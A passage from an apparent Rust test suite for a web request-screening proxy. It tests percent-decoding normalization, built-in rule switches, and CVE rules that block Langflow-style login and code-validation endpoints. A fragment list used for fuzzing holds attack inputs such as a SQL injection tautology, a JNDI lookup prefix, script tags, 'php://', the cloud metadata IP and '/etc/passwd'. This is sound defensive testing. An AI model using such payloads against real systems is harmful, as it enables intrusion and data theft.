        Some("vh-sqli-001".to_owned())
    );
}

#[test]
fn normalized_path_has_no_nul_for_rule_matching() {
    let path = prefilter::decoded_path("/a%00b").replace('\0', "");
    assert_eq!(path, "/ab");
}

// Property tests.

const FRAGMENTS: &[&str] = &[
    "%2e",
    "%252e",
    "%2525",
    "+",
    "%00",
    "\0",
    "../",
    "%2f",
    "<script>",
    "javascript:",
    "' or 1=1--",
    "${jndi:",
    "union",
    " select ",
    "%27",
    "%3C",
    "{{7*7}}",
    "php://",
    "169.254.169.254",
    "/etc/passwd",
    "sqlmap",
    "\u{3042}",
    "=",
    "&",
    "?",
    "/",
    "%",
    "a",
    "Z",
    "1",
];

/// Text built from attack-relevant fragments and arbitrary characters.
fn attack_text() -> impl Strategy<Value = String> {
    prop_oneof![
        proptest::collection::vec(proptest::sample::select(FRAGMENTS), 0..16)
            .prop_map(|parts| parts.concat()),
        ".{0,64}",
    ]
}

/// Text made of characters that encode to something after decoding: no `%`, `+` or NUL.
fn plain_text() -> impl Strategy<Value = String> {
    "[a-zA-Z0-9 /.'\"<>;:=()_-]{0,40}"
}

fn percent_encode_all(text: &str) -> String {
    text.bytes()
        .map(|byte| format!("%{byte:02X}"))
        .collect::<Vec<String>>()
        .concat()
}

proptest! {
    #[test]
    fn matching_never_panics_on_arbitrary_input(
        path in attack_text(),
        query in proptest::option::of(attack_text()),
        header in attack_text(),
        body in attack_text(),
    ) {
        let site = site_with(
            "rule r1 {\n    description \"d\";\n    action block;\n    path ~* \"%2e\";\n    query ~ \"%\";\n    header user-agent ~* \"x\";\n    body ~ \"a\\\\.b\";\n    any ~* \"(a+)+$\";\n}\n",
            "",
        );
        prop_assert!(site.is_ok(), "the fixture must parse");
        if let Ok(site) = site {
            let value = HeaderValue::from_bytes(header.as_bytes()).unwrap_or(HeaderValue::from_static("x"));
            let headers = [("user-agent", value.to_str().unwrap_or("x"))];
            let _ = screen_request(&site, "GET", &path, query.as_deref(), &headers, body.as_bytes());
            let _ = builtin_hit("POST", &path, query.as_deref(), &headers, body.as_bytes());
        }
    }

    #[test]
    fn normalization_removes_two_levels_of_encoding(text in plain_text()) {
        let encoded_twice = percent_encode_all(&percent_encode_all(&text));
        prop_assert_eq!(form_value(&encoded_twice), text.clone());
        prop_assert_eq!(header_value(&encoded_twice), text);
    }

    #[test]
    fn normalized_values_have_no_nul_and_no_escapes_left_after_a_second_pass(text in attack_text()) {
        let once = form_value(&text);
        prop_assert!(!once.contains('\0'));
        if !once.contains('%') && !once.contains('+') {
            prop_assert_eq!(form_value(&once), once.clone());
        }
    }
}

// Opt-in built-in rules: parsing, activation and matching.

/// Parses a rule written in the built-in scope, with the id `vh-test-001`.
fn parse_builtin_rule(body: &str) -> Result<ParsedRule, ConfigError> {
    let text = format!("rule vh-test-001 {{\n{body}\n}}\n");
    let directives = conf::parse_source(&text, "builtin.conf")?;
    let directive = directives.first().ok_or_else(|| ConfigError::Invalid {
        file: "builtin.conf".to_owned(),
        line: 1,
        message: "no directive".to_owned(),
    })?;
    parse_rule(directive, Scope::Builtin)
}

#[rstest]
#[case::off_in_the_built_in_file("description \"d\";\ndefault off;\naction block;\npath /x;", true)]
#[case::on_is_not_written("default on;\naction block;\npath /x;", false)]
#[case::repeated("default off;\ndefault off;\naction block;\npath /x;", false)]
fn default_is_read_only_in_the_built_in_file(#[case] body: &str, #[case] accepted: bool) {
    let parsed = parse_builtin_rule(body);
    assert_eq!(parsed.is_ok(), accepted, "{parsed:?}");
}

#[test]
fn default_off_is_refused_in_a_user_rule_with_its_line() {
    let text = message(config(
        "rule user-off {\n    description \"d\";\n    default off;\n    action block;\n    path /x;\n}\n",
        "",
    ));
    assert!(
        text.contains("\"default\" is only valid in a built-in rule"),
        "{text}"
    );
    assert!(text.contains("test.conf:4"), "{text}");
}

#[test]
fn a_built_in_rule_without_default_is_on() -> Result<(), ConfigError> {
    let parsed = parse_builtin_rule("action block;\npath /x;\ndescription \"d\";")?;
    assert!(parsed.rule.default_on);
    Ok(())
}

#[test]
fn default_off_is_parsed_into_the_rule() -> Result<(), ConfigError> {
    let parsed = parse_builtin_rule("description \"d\";\ndefault off;\naction block;\npath /x;")?;
    assert!(!parsed.rule.default_on);
    Ok(())
}

#[test]
fn enable_rule_must_name_a_built_in_rule() {
    let text = message(config("enable_rule vh-nope-001;", ""));
    assert!(
        text.contains("\"enable_rule\" names no built-in rule: vh-nope-001"),
        "{text}"
    );
    assert!(config("enable_rule vh-cve-2026-9103 vh-sqli-001;", "").is_ok());
    assert!(message(config("enable_rule;", "")).contains("needs at least one rule id"));
}

const ON: &str = "vh-sqli-001";
const OFF: &str = "vh-cve-2026-9103";

/// The ids of the block rules one site runs, for a configuration with `top` and `site_lines`.
fn block_ids(top: &str, site_lines: &str) -> Result<Vec<String>, ConfigError> {
    let cfg = config(top, site_lines)?;
    Ok(ids(&first_site(&cfg)?.rules.block))
}

#[rstest]
#[case::default_on_runs_without_any_switch("", "", ON, true)]
#[case::default_off_stays_off_without_a_switch("", "", OFF, false)]
#[case::top_level_enable_turns_on_a_default_off_rule(
    "enable_rule vh-cve-2026-9103;",
    "",
    OFF,
    true
)]
#[case::enabling_a_default_on_rule_is_harmless("enable_rule vh-sqli-001;", "", ON, true)]
#[case::top_level_disable_turns_off_a_default_on_rule("disable_rule vh-sqli-001;", "", ON, false)]
#[case::same_level_disable_wins_over_enable(
    "enable_rule vh-cve-2026-9103;\ndisable_rule vh-cve-2026-9103;",
    "",
    OFF,
    false
)]
#[case::site_enable_overrides_inherited_top_disable(
    "disable_rule vh-cve-2026-9103;",
    "enable_rule vh-cve-2026-9103;",
    OFF,
    true
)]
#[case::site_disable_overrides_inherited_top_enable(
    "enable_rule vh-cve-2026-9103;",
    "disable_rule vh-cve-2026-9103;",
    OFF,
    false
)]
#[case::site_enable_without_a_top_switch("", "enable_rule vh-cve-2026-9103;", OFF, true)]
#[case::same_level_disable_wins_at_a_site(
    "",
    "enable_rule vh-cve-2026-9103;\ndisable_rule vh-cve-2026-9103;",
    OFF,
    false
)]
#[case::builtin_off_keeps_a_default_on_rule_off("builtin_rules off;", "", ON, false)]
#[case::builtin_off_still_runs_an_enabled_rule(
    "builtin_rules off;",
    "enable_rule vh-cve-2026-9103;",
    OFF,
    true
)]
#[case::builtin_off_at_site_still_runs_a_top_enabled_rule(
    "enable_rule vh-cve-2026-9103;",
    "builtin_rules off;",
    OFF,
    true
)]
#[case::builtin_off_at_site_keeps_a_default_on_rule_off(
    "",
    "builtin_rules off;\nenable_rule vh-cve-2026-9103;",
    ON,
    false
)]
#[case::site_disable_beats_top_enable_on_a_default_on_rule(
    "enable_rule vh-sqli-001;",
    "disable_rule vh-sqli-001;",
    ON,
    false
)]
fn a_built_in_rule_runs_at_a_site_only_as_its_switches_decide(
    #[case] top: &str,
    #[case] site_lines: &str,
    #[case] id: &str,
    #[case] active: bool,
) -> Result<(), ConfigError> {
    let block = block_ids(top, site_lines)?;
    assert_eq!(block.iter().any(|name| name == id), active, "{block:?}");
    Ok(())
}

#[test]
fn an_enabled_rule_runs_on_the_site_that_enables_it_only() -> Result<(), ConfigError> {
    let text = "listen 127.0.0.1:8080;\n\
        decision {\n    backend http;\n    url http://stub-decider:9000/decide;\n}\n\
        site langflow.example {\n    upstream http://upstream:80;\n    enable_rule vh-cve-2026-9103 vh-cve-2026-8481;\n}\n\
        site other.example {\n    upstream http://upstream:80;\n}\n";
    let cfg = Config::parse_str(text, "test.conf")?;
    for site in &cfg.sites {
        let block = ids(&site.rules.block);
        let enabled = site.hosts.iter().any(|host| host == "langflow.example");
        assert_eq!(block.contains(&OFF.to_owned()), enabled, "{block:?}");
        assert_eq!(
            block.contains(&"vh-cve-2026-8481".to_owned()),
            enabled,
            "{block:?}"
        );
    }
    Ok(())
}

#[rstest]
#[case::exact_path("GET", "/api/v1/login/auto_login")]
#[case::any_method_post("POST", "/api/v1/login/auto_login")]
#[case::trailing_slash("GET", "/api/v1/login/auto_login/")]
#[case::trailing_segment("GET", "/api/v1/login/auto_login/extra")]
#[case::double_slash("GET", "//api/v1/login/auto_login")]
#[case::percent_encoded_letter("GET", "/api/v1/login/%61uto_login")]
#[case::dot_segment("GET", "/api/v1/login/../login/auto_login")]
#[case::semicolon_suffix("GET", "/api/v1/login/auto_login;x")]
fn cve_9103_matches_the_endpoint_in_its_normalized_forms(#[case] method: &str, #[case] path: &str) {
    assert_eq!(
        builtin_hit(method, path, None, UA, b"").as_deref(),
        Some("vh-cve-2026-9103")
    );
}

#[rstest]
#[case::login_root("/api/v1/login")]
#[case::login_root_slash("/api/v1/login/")]
#[case::other_endpoint("/api/v1/logout")]
#[case::lookalike_segment("/api/v1/login/autologin")]
fn cve_9103_leaves_other_login_paths_alone(#[case] path: &str) {
    assert_eq!(builtin_hit("GET", path, None, UA, b""), None);
}

#[rstest]
#[case::exact_path("/api/v1/validate/code")]
#[case::trailing_slash("/api/v1/validate/code/")]
#[case::double_slash("//api/v1/validate/code")]
#[case::percent_encoded_letter("/api/v1/validate/%63ode")]
fn cve_8481_blocks_post_to_the_endpoint_in_its_normalized_forms(#[case] path: &str) {
    assert_eq!(
        builtin_hit("POST", path, None, UA, b"{\"code\": \"x\"}").as_deref(),
        Some("vh-cve-2026-8481")
    );
}

#[rstest]
#[case::get("GET", "/api/v1/validate/code")]
#[case::put("PUT", "/api/v1/validate/code")]
#[case::delete("DELETE", "/api/v1/validate/code")]
#[case::post_to_another_endpoint("POST", "/api/v1/validate/prompt")]
#[case::post_to_the_parent("POST", "/api/v1/validate")]
fn cve_8481_leaves_other_methods_and_paths_alone(#[case] method: &str, #[case] path: &str) {
    assert_eq!(builtin_hit(method, path, None, UA, b""), None);
}

proptest! {
    #[test]
    fn a_default_off_rule_never_matches_unless_it_is_enabled(
        method in proptest::sample::select(vec!["GET", "POST", "PUT", "DELETE"]),
        path in "(/api/v1/login/auto_login|/api/v1/validate/code|/api/v1/login|/)[a-zA-Z0-9/;.%_-]{0,24}",
        query in proptest::option::of(attack_text()),
    ) {
        let site = site_with("", "");
        prop_assert!(site.is_ok(), "the fixture must parse");
        if let Ok(site) = site {
            prop_assert!(site.rules.block.iter().all(|rule| rule.default_on));
            let shipped_off: Vec<Arc<str>> = builtin_rules()
                .unwrap_or(&[])
                .iter()
                .filter(|rule| !rule.default_on)
                .map(|rule| Arc::clone(&rule.id))
                .collect();
            prop_assert!(shipped_off.len() >= 2, "the CVE rules are shipped off");
            let map = HeaderMap::new();
            let client = IpAddr::V4(Ipv4Addr::new(192, 0, 2, 1));
            let method = Method::from_bytes(method.as_bytes()).unwrap_or(Method::GET);
            let input = RuleInput::new(&method, &path, query.as_deref(), &map, b"", client);
            let hit = matching::first_match(&site.rules.block, &input);
            prop_assert!(hit.is_none_or(|rule| !shipped_off.contains(&rule.id)));
        }
    }
}
